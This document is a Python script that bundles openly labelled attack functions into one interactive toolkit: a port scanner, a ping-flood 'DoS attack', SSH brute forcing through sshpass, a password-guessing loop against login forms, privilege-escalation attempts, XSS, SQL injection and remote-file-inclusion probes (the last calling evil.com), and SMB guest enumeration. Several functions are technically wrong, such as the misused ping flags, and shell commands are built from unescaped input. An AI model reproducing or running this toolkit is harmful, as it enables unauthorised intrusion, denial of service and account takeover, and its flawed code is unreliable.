import os
import requests
import socket
import hashlib
import subprocess
import sys
import platform
import dns.resolver
import json
import urllib.parse
import nmap
import smbprotocol
from smbprotocol import SMBConnection
from urllib.parse import urlparse
from requests.auth import HTTPBasicAuth

# Function to scan for open ports
def port_scanner(target):
    open_ports = []
    for port in range(1, 1024):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

# Function to download files from a URL
def download_file(url, save_path):
    response = requests.get(url, stream=True)
    with open(save_path, 'wb') as file:
        for chunk in response.iter_content(1024):
            if chunk:
                file.write(chunk)
    return f"File downloaded to {save_path}"

# Function to hash a string
def hash_string(input_string):
    hashed = hashlib.sha256(input_string.encode()).hexdigest()
    return hashed

# Function to execute shell commands remotely
def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

# Function to perform a simple denial-of-service (DoS) attack
def dos_attack(target, port, duration):
    print(f"Starting DoS attack on {target}:{port} for {duration} seconds...")
    command = f"ping -f {target} -p {port} -t {duration}"
    return execute_command(command)

# Function to perform a simple brute force attack on SSH
def brute_force_ssh(target, user, wordlist):
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            command = f"sshpass -p {password} ssh {user}@{target} echo 'Success!'"
            result = execute_command(command)
            if "Success" in result:
                return f"Brute force successful! Password: {password}"
    return "Brute force failed."

# Function to escalate privileges to Admin
def escalate_privileges():
    current_platform = platform.system()
    if current_platform == "Windows":
        # Try running the script as Admin on Windows
        command = "powershell Start-Process cmd -Verb runAs"
        return execute_command(command)
    elif current_platform == "Linux" or current_platform == "Darwin":
        # Try sudo on Linux or macOS
        command = "sudo -v"
        return execute_command(command)
    else:
        return "Unknown platform, privilege escalation not supported."

# Function to get DNS records for a target domain
def dns_lookup(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        return [ip.address for ip in result]
    except Exception as e:
        return f"DNS lookup failed: {str(e)}"

# Function to get IP geolocation info
def ip_geolocation(ip):
    url = f"http://ip-api.com/json/{ip}"
    try:
        response = requests.get(url)
        geolocation_data = response.json()
        if geolocation_data['status'] == 'fail':
            return "Geolocation lookup failed."
        return json.dumps(geolocation_data, indent=4)
    except Exception as e:
        return f"Error getting geolocation: {str(e)}"

# Function to perform XSS (Cross-site scripting) vulnerability test
def xss_test(url, payload="<script>alert('XSS')</script>"):
    test_url = f"{url}?q={payload}"
    response = requests.get(test_url)
    if payload in response.text:
        return f"Potential XSS vulnerability found at {test_url}"
    return "No XSS vulnerability found."

# Function for SQL Injection Testing
def sql_injection_test(url, payload="' OR 1=1 --"):
    test_url = f"{url}?q={urllib.parse.quote(payload)}"
    response = requests.get(test_url)
    if "error" in response.text.lower() or "syntax" in response.text.lower():
        return f"Possible SQL Injection vulnerability at {test_url}"
    return "No SQL injection vulnerability found."

# Function for HTTP Header Analysis
def http_header_analysis(url):
    try:
        response = requests.head(url)
        headers = response.headers
        return json.dumps(headers, indent=4)
    except Exception as e:
        return f"Error fetching headers: {str(e)}"

# Function for OS Fingerprinting using Nmap
def os_fingerprint(target):
    nm = nmap.PortScanner()
    try:
        nm.scan(target, '22-1024')  # You can change the port range as needed
        os_info = nm[target]['osmatch']
        return f"OS Fingerprinting Results:\n{json.dumps(os_info, indent=4)}"
    except Exception as e:
        return f"OS Fingerprinting failed: {str(e)}"

# Function for SMB Enumeration
def smb_enumeration(target):
    try:
        smbprotocol.ClientConfig(username="guest", password="")
        conn = SMBConnection(target, target)
        conn.connect()
        shares = conn.listShares()
        return f"Shares on {target}: {shares}"
    except Exception as e:
        return f"SMB Enumeration failed: {str(e)}"

# Function for Credential Stuffing Attack
def credential_stuffing_attack(target_url, username, wordlist):
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            response = requests.post(target_url, data={"username": username, "password": password})
            if "Welcome" in response.text:  # Assuming successful login redirects to a page with "Welcome"
                return f"Credential stuffing successful! Password: {password}"
    return "Credential stuffing failed."

# Function for Remote File Inclusion (RFI) test
def rfi_test(url, payload="http://evil.com/malicious_file"):
    test_url = f"{url}?file={urllib.parse.quote(payload)}"
    response = requests.get(test_url)
    if "error" not in response.text.lower():
        return f"Remote File Inclusion vulnerability found at {test_url}"
    return "No RFI vulnerability found."

# Main function to use the tools
def main():
    target_ip = input("Enter target IP: ")
    print("Scanning open ports...")
    open_ports = port_scanner(target_ip)
    print(f"Open ports: {open_ports}")
    
    file_url = input("Enter file URL to download: ")
    save_path = input("Enter path to save the file: ")
    print(download_file(file_url, save_path))
    
    string_to_hash = input("Enter string to hash: ")
    print(f"SHA-256 Hash: {hash_string(string_to_hash)}")
    
    action = input("Do you want to perform a DoS attack? (y/n): ")
    if action.lower() == 'y':
        target = input("Enter target IP: ")
        port = input("Enter port: ")
        duration = input("Enter attack duration (in seconds): ")
        print(dos_attack(target, port, duration))
    
    action = input("Do you want to perform brute force SSH? (y/n): ")
    if action.lower() == 'y':
        target = input("Enter target IP: ")
        user = input("Enter SSH username: ")
        wordlist = input("Enter path to wordlist: ")
        print(brute_force_ssh(target, user, wordlist))
    
    # Try to escalate privileges to Admin
    escalate_action = input("Do you want to escalate privileges to Admin? (y/n): ")
    if escalate_action.lower() == 'y':
        print(escalate_privileges())
    
    # Perform DNS lookup
    dns_action = input("Do you want to perform a DNS lookup? (y/n): ")
    if dns_action.lower() == 'y':
        domain = input("Enter domain for DNS lookup: ")
        print(dns_lookup(domain))
    
    # Perform IP geolocation
    geo_action = input("Do you want to perform IP geolocation? (y/n): ")
    if geo_action.lower() == 'y':
        ip = input("Enter IP for geolocation: ")
        print(ip_geolocation(ip))
    
    # Perform XSS test
    xss_action = input("Do you want to perform an XSS test? (y/n): ")
    if xss_action.lower() == 'y':
        url = input("Enter URL to test for XSS vulnerability: ")
        print(xss_test(url))
    
    # Perform SQL Injection test
    sql_action = input("Do you want to perform an SQL Injection test? (y/n): ")
    if sql_action.lower() == 'y':
        url = input("Enter URL to test for SQL Injection vulnerability: ")
        print(sql_injection_test(url))
    
    # Perform HTTP Header analysis
    header_action = input("Do you want to perform HTTP header analysis? (y/n): ")
    if header_action.lower() == 'y':
        url = input("Enter URL for HTTP header analysis: ")
        print(http_header_analysis(url))
    
    # Perform OS Fingerprinting
    os_fingerprint_action = input("Do you want to perform OS fingerprinting? (y/n): ")
    if os_fingerprint_action.lower() == 'y':
        target = input("Enter target IP for OS fingerprinting: ")
        print(os_fingerprint(target))
    
    # Perform SMB Enumeration
    smb_action = input("Do you want to perform SMB enumeration? (y/n): ")
    if smb_action.lower() == 'y':
        target = input("Enter target IP for SMB enumeration: ")
        print(smb_enumeration(target))
    
    # Perform Credential Stuffing Attack
    stuffing_action = input("Do you want to perform Credential Stuffing Attack? (y/n): ")
    if stuffing_action.lower() == 'y':
        target_url = input("Enter target URL for login page: ")
        username = input("Enter username for login: ")
        wordlist = input("Enter path to wordlist: ")
        print(credential_stuffing_attack(target_url, username, wordlist))
    
    # Perform Remote File Inclusion test
    rfi_action = input("Do you want to perform Remote File Inclusion test? (y/n): ")
    if rfi_action.lower() == 'y':
        url = input("Enter URL to test for RFI vulnerability: ")
        print(rfi_test(url))

if __name__ == "__main__":
    main()
